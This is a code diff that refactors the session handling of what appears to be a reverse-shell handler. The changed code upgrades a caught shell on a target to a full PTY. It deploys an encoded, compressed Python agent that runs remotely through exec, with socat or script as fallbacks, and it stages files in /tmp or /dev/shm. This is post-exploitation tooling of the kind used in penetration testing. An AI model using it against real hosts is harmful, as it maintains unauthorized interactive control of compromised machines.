@@ -1339,7 +1339,7 @@ class Session:
 		self.subtype = None
 		self.interactive = None
 		self.echoing = None
-		self.reverse_pty = None
+		self.pty_ready = None
 		self.readline = None
 
 		self.version = None
@@ -1377,6 +1377,7 @@ class Session:
 		self._cwd = None
 		self._bsd = None
 		self._tty = None
+		self._can_deploy_agent = None
 
 		self.bypass_control_session = False
 
@@ -1482,6 +1483,26 @@ class Session:
 		return self.socket.fileno()
 
 	@property
+	def can_deploy_agent(self):
+		if self._can_deploy_agent is None:
+			if Path(self.directory / ".noagent").exists():
+				self._can_deploy_agent = False
+			else:
+				_bin = self.bin['python3'] or self.bin['python']
+				if _bin:
+					version = self.exec(f"{_bin} -V || {_bin} --version", value=True)
+					major, minor, micro = re.search("Python (\d+)\.(\d+)(?:\.(\d+))?", version).groups()
+					self.remote_python_version = (int(major), int(minor), int(micro))
+					if self.remote_python_version >= (2, 3): # TODO
+						self._can_deploy_agent = True
+					else:
+						self._can_deploy_agent = False
+				else:
+					self._can_deploy_agent = False
+
+		return self._can_deploy_agent
+
+	@property
 	def spare_control_sessions(self):
 		return [session for session in self.control_sessions if session is not self]
 
@@ -1503,9 +1524,8 @@ class Session:
 			for session in core.hosts[self.name]:
 				if not session.need_control_session:
 					return session
-			return None #self.spawn() #TODO
-		else:
-			return self
+			return None # TODO self.spawn()
+		return self
 
 	def get_shell_pid(self):
 		if self.OS == 'Unix':
@@ -1622,7 +1642,6 @@ class Session:
 				logger.debug(f"Trying to find a writable directory on target")
 				tmpname = rand(10)
 				common_dirs = ("/dev/shm", "/tmp", "/var/tmp")
-
 				for directory in common_dirs:
 					if not self.exec(f'echo {tmpname} > {directory}/{tmpname}'):
 						self.exec(f'rm {directory}/{tmpname}')
@@ -1774,7 +1793,7 @@ class Session:
 
 			elif b'/dev/pts/' in response:
 				self.type =	'PTY'
-				self.reverse_pty = True
+				self.pty_ready = True
 				self._tty = re.search(rb'/dev/pts/\d*', response)[0].decode()
 
 			return True
@@ -2132,50 +2151,42 @@ class Session:
 		return self.need_binary(name, url)
 
 	def upgrade(self):
-		if self.agent:
-			logger.warning("PTY agent is already deployed")
-			return False
-
-		self.bypass_control_session = True
-		deploy_agent = (self.bin['python3'] or self.bin['python']) and not Path(self.directory / ".noagent").exists()
-		self.bypass_control_session = False
-
-		if self.type == "PTY":
-			if deploy_agent:
-				logger.info("Attempting to deploy agent...")
-			#else:
-			#	return False
-		else:
-			logger.info("Attempting to upgrade shell to PTY...")
-
 		if self.OS == "Unix":
-			self.bypass_control_session = True
-			self.shell = self.bin['bash'] if self.bin['bash'] else self.bin['sh']
-			self.bypass_control_session = False
+			if self.agent:
+				logger.warning("Python agent is already deployed")
+				return False
 
+			if self.need_control_sessions and self.control_sessions == [self]:
+				logger.warning("This is a control session and cannot be upgraded")
+				return False
+
+			if self.type == "PTY":
+				if self.can_deploy_agent:
+					logger.info("Attempting to deploy agent...")
+				elif not self.pty_ready:
+					logger.warning("This shell is already PTY and Python agent cannot be deployed...")
+					return False
+			else:
+				logger.info("Attempting to upgrade shell to PTY...")
+
+			self.shell = self.bin['bash'] or self.bin['sh']
 			if not self.shell:
 				logger.warning("Cannot detect shell. Abort upgrading...")
 				return False
 
 			socat_cmd = f"{{}} - exec:{self.shell},pty,stderr,setsid,sigint,sane;exit 0"
-			if deploy_agent:
-				if self.bin['python3']:
-					_bin = self.bin['python3']
+			if self.can_deploy_agent:
+				_bin = self.bin['python3'] or self.bin['python']
+				if self.remote_python_version >= (3,):
 					_decode = 'b64decode'
 					_exec = 'exec(cmd, globals(), locals())'
-
-				elif self.bin['python']:
-					_bin = self.bin['python']
+				else:
 					_decode = 'decodestring'
 					_exec = 'exec cmd in globals(), locals()'
 
-				deploy_agent = True
-
 				agent = textwrap.dedent('\n'.join(AGENT.splitlines()[1:])).format(self.shell, NET_BUF_SIZE, MESSENGER, STREAM, _exec)
 				payload = base64.b64encode(zlib.compress(agent.encode(), 9)).decode()
-				cmd = (
-					f'{_bin} -c \'import base64,zlib;exec(zlib.decompress(base64.{_decode}("{payload}")))\''
-				)
+				cmd = f'{_bin} -c \'import base64,zlib;exec(zlib.decompress(base64.{_decode}("{payload}")))\''
 
 			elif self.bin['script']:
 				_bin = self.bin['script']
@@ -2189,17 +2200,12 @@ class Session:
 				_bin = self.tmp + '/socat'
 				if not self.exec(f"test -f {_bin} || echo x"): # TODO maybe needs rstrip
 					cmd = socat_cmd.format(_bin)
-
 				else:
 					logger.warning("Cannot upgrade shell with the available binaries...")
-					socat_binary = self.need_binary(
-						"socat",
-						BINARIES['socat']
-						)
+					socat_binary = self.need_binary("socat", BINARIES['socat'])
 					if socat_binary:
 						_bin = socat_binary
 						cmd = socat_cmd.format(_bin)
-
 					else:
 						if readline:
 							logger.info("Readline support enabled")
@@ -2209,13 +2215,10 @@ class Session:
 							logger.error("Falling back to basic shell support")
 							return False
 
-			if not deploy_agent and not self.spare_control_sessions: #### TODO
-				logger.warning("Agent cannot be deployed. I need to maintain at least one basic session...")
+			if not self.can_deploy_agent and not self.spare_control_sessions: #### TODO
+				logger.warning("Python agent cannot be deployed. I need to maintain at least one basic session...")
 				core.session_wait_host = self.name
-				self.bypass_control_session = True
 				self.spawn()
-				self.bypass_control_session = False
-
 				try:
 					new_session = core.sessions[core.session_wait.get(timeout=options.short_timeout)]
 					core.session_wait_host = None
@@ -2224,18 +2227,15 @@ class Session:
 					logger.error("Failed spawning new session")
 					return False
 
-				if not self.type == "PTY":
+				if self.type == "Basic":
 					new_session.upgrade()
 					if caller() == 'attach':
 						new_session.attach()
+					return True
 
-				return False
-
-			if self.reverse_pty:
-				self.bypass_control_session = True
+			if self.pty_ready:
 				self.exec("stty -echo")
 				self.echoing = False
-				self.bypass_control_session = False
 
 			elif self.interactive:
 				# Some shells are unstable in interactive mode
@@ -2246,10 +2246,8 @@ class Session:
 				self.exec(f"exec nohup {self.shell}", raw=True)
 				self.echoing = False
 
-			self.bypass_control_session = True
-			expect = (b"\x01",) if deploy_agent else None
-			response = self.exec(f'export TERM=xterm-256color; export SHELL={self.shell}; {cmd}', separate=deploy_agent, expect=expect, raw=True)
-			self.bypass_control_session = False
+			expect = (b"\x01",) if self.can_deploy_agent else None
+			response = self.exec(f'export TERM=xterm-256color; export SHELL={self.shell}; {cmd}', separate=self.can_deploy_agent, expect=expect, raw=True)
 			if not isinstance(response, bytes):
 				logger.error("The shell became unresponsive. I am killing it, sorry... Next time I will not try to deploy agent")
 				Path(self.directory / ".noagent").touch()
@@ -2258,12 +2256,11 @@ class Session:
 
 			logger.info(f"Shell upgraded successfully using {paint(_bin).yellow}{paint().green}! 💪")
 
+			self.agent = 		self.can_deploy_agent
 			self.type =		'PTY'
 			self.interactive =	 True
 			self.echoing =		 True
 			self.prompt =		response
-
-			self.agent = 		deploy_agent
 
 			self.get_shell_pid()
 
@@ -2310,24 +2307,11 @@ class Session:
 		if threading.current_thread().name != 'Core':
 			if self.new:
 				self.new = False
-
-				if not options.no_upgrade and (not self.type == 'PTY' or not (self.reverse_pty and self.agent)):
-					self.upgrade()
-				elif options.no_upgrade and self.type == 'PTY':
-					logger.warning("Agent is not deployed. I need to maintain at least one basic session...")
-					core.session_wait_host = self.name
-					self.bypass_control_session = True
-					self.spawn()
-					self.shell = self.bin['bash'] if self.bin['bash'] else self.bin['sh']
-					self.exec(f'export TERM=xterm-256color; export SHELL={self.shell}', raw=True)
-					self.get_shell_pid()
-					self.bypass_control_session = False
-					try:
-						new_session = core.sessions[core.session_wait.get(timeout=options.short_timeout)]
-						core.session_wait_host = None
-					except queue.Empty:
-						logger.error("Failed spawning new session")
-						return False
+				self.bypass_control_session = True
+				if not options.no_upgrade:
+					if not (self.need_control_session and self.control_sessions == [self]):
+						self.upgrade()
+				self.bypass_control_session = False
 
 				if self.prompt:
 					self.record(self.prompt)
